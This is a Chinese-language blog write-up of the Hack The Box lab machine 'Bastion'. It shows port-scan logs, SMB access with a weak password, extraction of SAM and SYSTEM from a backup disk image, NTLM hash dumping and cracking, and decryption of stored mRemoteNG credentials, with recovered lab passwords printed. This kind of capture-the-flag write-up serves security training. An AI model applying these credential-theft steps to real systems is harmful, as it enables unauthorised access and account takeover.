---
layout: post
title: HTB——Bastion
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Bastion/01.png?raw=true)

# 0x01 信息收集

```bash
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0
                                                                                                 
[2025-04-25 05:18:03] [INFO] 暴力破解线程数: 1                                                   
[2025-04-25 05:18:03] [INFO] 开始信息扫描
[2025-04-25 05:18:03] [INFO] 最终有效主机数量: 1
[2025-04-25 05:18:03] [INFO] 开始主机扫描
[2025-04-25 05:18:03] [INFO] 有效端口数量: 233
[2025-04-25 05:18:03] [SUCCESS] 端口开放 10.129.173.67:135
[2025-04-25 05:18:03] [SUCCESS] 端口开放 10.129.173.67:139
[2025-04-25 05:18:03] [SUCCESS] 端口开放 10.129.173.67:22
[2025-04-25 05:18:03] [SUCCESS] 端口开放 10.129.173.67:445
[2025-04-25 05:18:03] [SUCCESS] 服务识别 10.129.173.67:22 => [ssh] 版本:for_Windows_7.9 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_for_Windows_7.9.]                                  
[2025-04-25 05:18:08] [SUCCESS] 服务识别 10.129.173.67:139 =>  Banner:[.]
[2025-04-25 05:18:08] [SUCCESS] 服务识别 10.129.173.67:445 => 
[2025-04-25 05:19:08] [SUCCESS] 服务识别 10.129.173.67:135 => 
[2025-04-25 05:19:08] [INFO] 存活端口数量: 4
[2025-04-25 05:19:08] [INFO] 开始漏洞扫描
[2025-04-25 05:19:08] [INFO] 加载的插件: findnet, ms17010, netbios, smb, smb2, smbghost, ssh
[2025-04-25 05:19:09] [SUCCESS] NetInfo 扫描结果
目标主机: 10.129.173.67                                                                          
主机名: Bastion                                                                                  
发现的网络接口:                                                                                  
   IPv4地址:                                                                                     
      └─ 10.129.173.67                                                                           
   IPv6地址:                                                                                     
      └─ dead:beef::5487:7f8b:d8cf:a6b4                                                          
      └─ dead:beef::206                                                                          
[2025-04-25 05:19:38] [INFO] SMB2共享信息 10.129.173.67:445 admin Pass:123456 共享:[ADMIN$ Backups C$ IPC$]                                                                                       
[2025-04-25 05:19:44] [SUCCESS] SMB认证成功 10.129.173.67:445 admin:123456
[2025-04-25 05:30:31] [SUCCESS] 扫描已完成: 7/7

 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.7  Expired: 2026.01.01
[05:18:53] [INFO] Start IpScan:10.129.173.67
[05:18:53] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[05:18:53] [+] 10.129.173.67:139 open
[05:18:53] [+] 10.129.173.67:135 open
[05:18:53] [+] 10.129.173.67:22 open                        
端口扫描   1% [░░░░░░░░░░░░░░░░░░░░] (765/65535) [0s:56s][05:18:53] [+] 10.129.173.67:445 open
[05:18:53] [+] [TCP/SSH]  [OpenSSH for_Windows_7.9] 10.129.173.67:22 [SSH-2.0-OpenSSH_for_Windows_7.9]                                                                                            
[05:18:53] [INFO] start SSH check 10.129.173.67:22
[05:18:53] [+] 开始 SshScan 任务: SSH://10.129.173.67:22
[05:18:54] [+] [TCP/RPC]  [Microsoft Windows RPC] 10.129.173.67:135 [.@]
[05:18:54] [+] [TCP/NETBIOS]  [Microsoft Windows netbios-ssn] 10.129.173.67:139 [.]
[05:18:54] [INFO] start WMI check 10.129.173.67:135
[05:18:54] [+] 开始 WmiExec 任务: WMI://10.129.173.67:135
[05:18:54] [+] 10.129.173.67:5985 open                      
[05:18:57] [+] [TCP/SMB]  [Microsoft Windows Server 2008 R2 - 2012 microsoft-ds] 10.129.173.67:445 [hostname: BASTION domain: WORKGROUP]
[05:18:57] [INFO] start SMB check 10.129.173.67:445
端口扫描  33% [██████░░░░░░░░░░░░░░] (21989/65535) [0s:0s][05:18:57] [+] 开始 SmbScan 任务: SMB://10.129.173.67:445
[05:19:01] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0][Microsoft HTTPAPI httpd 2.0] http://10.129.173.67:5985 [Not Found]
[05:19:01] [INFO] start WinRM check 10.129.173.67:5985
[05:19:01] [+] 开始 WinRMScan 任务: WinRM://10.129.173.67:5985
[05:19:02] [+] 10.129.173.67:47001 open
[05:19:03] [+] 10.129.173.67:49665 open
[05:19:03] [+] 10.129.173.67:49668 open
[05:19:03] [+] 10.129.173.67:49667 open
[05:19:03] [+] 10.129.173.67:49666 open
[05:19:03] [+] 10.129.173.67:49664 open
[05:19:03] [+] 10.129.173.67:49670 open
[05:19:03] [+] 10.129.173.67:49669 open                   
                                                          
[05:19:08] [+] alive ports is: 13
[05:19:08] [+] Ip扫描结束:10.129.173.67
[05:19:08] [INFO] Start UrlScan:http://10.129.173.67:5985
[05:19:08] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0] http://10.129.173.67:5985 [Not Found]
                                                 
[05:19:08] [+] Url扫描结束:http://10.129.173.67:5985
[05:19:08] [+] 项目任务完成:Default, Timeuse：15.801036907
[05:19:08] [+] 扫描结束,耗时: 16.021020594s
```

---

# 0x02 SMB获取敏感数据

经典的弱密码SMB服务，我们先查看一下会不会塞东西进去。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Bastion]
└─# smbclient -L //10.129.173.67 -U admin    
Password for [WORKGROUP\admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.173.67 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

┌──(root㉿kali)-[/home/kali/HTB/Bastion]
└─# smbclient //10.129.173.67/Backups -U admin
Password for [WORKGROUP\admin]:
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \note.txt of size 116 as note.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
getting file \SDT65CB.tmp of size 0 as SDT65CB.tmp (0.0 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \WindowsImageBackup\L4mpje-PC\MediaId of size 16 as WindowsImageBackup/L4mpje-PC/MediaId (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd of size 37761024 as WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd (9139.0 KiloBytes/sec) (average 7256.2 KiloBytes/sec)
```

将文件薅下来后，我们首要查看的就是txt.但txt内未给到有效数据，我们再转去查看提供的两个Image文件，都是`vhd`。磁盘文件我们使用FTK打开，提取出里面的`SAM`和`SYSTEM`来尝试提取NTLM

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Bastion/02.png?raw=true)
```bash
┌──(root㉿kali)-[/home/kali/HTB/Bastion]
└─# impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up...
```

我们使用`hashcat`尝试爆破`L4mpje`的密码，可得到如下密码

```bash
26112010952d963c8dc4217daec986d9:bureaulampje

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 26112010952d963c8dc4217daec986d9
Time.Started.....: Fri Apr 25 11:27:36 2025 (1 sec)
Time.Estimated...: Fri Apr 25 11:27:37 2025 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  8436.0 kH/s (0.11ms) @ Accel:128 Loops:1 Thr:128 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 9835056/14344386 (68.56%)
Rejected.........: 4656/9835056 (0.05%)
Restore.Point....: 8851627/14344386 (61.71%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: d3103421 -> babyjd17
Hardware.Mon.#1..: Temp: 49c Util:  7% Core:1912MHz Mem:14001MHz Bus:8
```

得到账密后，我们尝试从SSH登录此账户。前面的信息收集中我们已经得知了靶机安装了适用于windows的OpenSSH，直接登陆即可

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Bastion/03.png?raw=true)

---

# 0x03 mRemoteNG解密admin账密

查看`Program Files(x86)`，我们可查看到其主机上安装了`mRemoteNG`

```cmd
l4mpje@BASTION C:\Program Files (x86)>dir                                       
 Volume in drive C has no label.                                                
 Volume Serial Number is 1B7D-E692                                              

 Directory of C:\Program Files (x86)                                            

22-02-2019  15:01    <DIR>          .                                           
22-02-2019  15:01    <DIR>          ..                                          
16-07-2016  15:23    <DIR>          Common Files                                
23-02-2019  10:38    <DIR>          Internet Explorer                           
16-07-2016  15:23    <DIR>          Microsoft.NET                               
22-02-2019  15:01    <DIR>          mRemoteNG                                   
23-02-2019  11:22    <DIR>          Windows Defender                            
23-02-2019  10:38    <DIR>          Windows Mail                                
23-02-2019  11:22    <DIR>          Windows Media Player                        
16-07-2016  15:23    <DIR>          Windows Multimedia Platform                 
16-07-2016  15:23    <DIR>          Windows NT                                  
23-02-2019  11:22    <DIR>          Windows Photo Viewer                        
16-07-2016  15:23    <DIR>          Windows Portable Devices                    
16-07-2016  15:23    <DIR>          WindowsPowerShell                           
               0 File(s)              0 bytes                                   
              14 Dir(s)   4.821.897.216 bytes free
```

上网查询发现其是一个远程管理工具，那我们看能不能把他存密码的文件薅出来。存在当前用户的`AppData/Roaming/mRemoteNG/`下的`confCons.xml`文件内。采用以下项目脚本来解密即可

- https://github.com/kmahyyg/mremoteng-decrypt

```bash
PS S:\tools\渗透\HTB\Bastion\mremoteng-decrypt-2.1> C:\Users\GAiLO\AppData\Local\Programs\Python\Python310\python.exe .\mremoteng_decrypt.py -rf confCons.xml
Username: Administrator
Hostname: 127.0.0.1
Password: thXLHM96BeKL0ER2

Username: L4mpje
Hostname: 192.168.1.75
Password: bureaulampje
```

拿到了admin的账密就打完了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Bastion/04.png?raw=true)